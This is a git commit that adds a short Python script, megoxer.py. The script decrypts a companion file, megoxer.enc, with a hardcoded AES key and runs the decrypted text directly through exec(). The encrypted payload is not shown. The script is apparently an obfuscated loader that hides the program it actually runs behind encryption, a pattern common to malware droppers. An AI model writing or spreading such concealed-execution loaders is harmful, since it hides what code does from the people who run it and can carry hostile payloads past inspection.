25e17e4df614e48555d1975f094ebf1fb402f866
srkyt555 <ghub55501@gmail.com>
2025-02-19 15:40:30 +0530

    Add files via upload

---
+++ megoxer.py
@@ -0,0 +1,16 @@
+import base64
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+KEY = base64.b64decode("lZpoYZxLkJ6gcwy4eQWIfkvjWy98B0qdGsapqsnqc8E=")
+
+def aes_decrypt(data, key):
+    raw_data = base64.b64decode(data)
+    iv, encrypted = raw_data[:16], raw_data[16:]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()
+
+with open("megoxer.enc", "r", encoding="utf-8") as enc_file:
+    encrypted_script = enc_file.read()
+
+exec(aes_decrypt(encrypted_script, KEY))
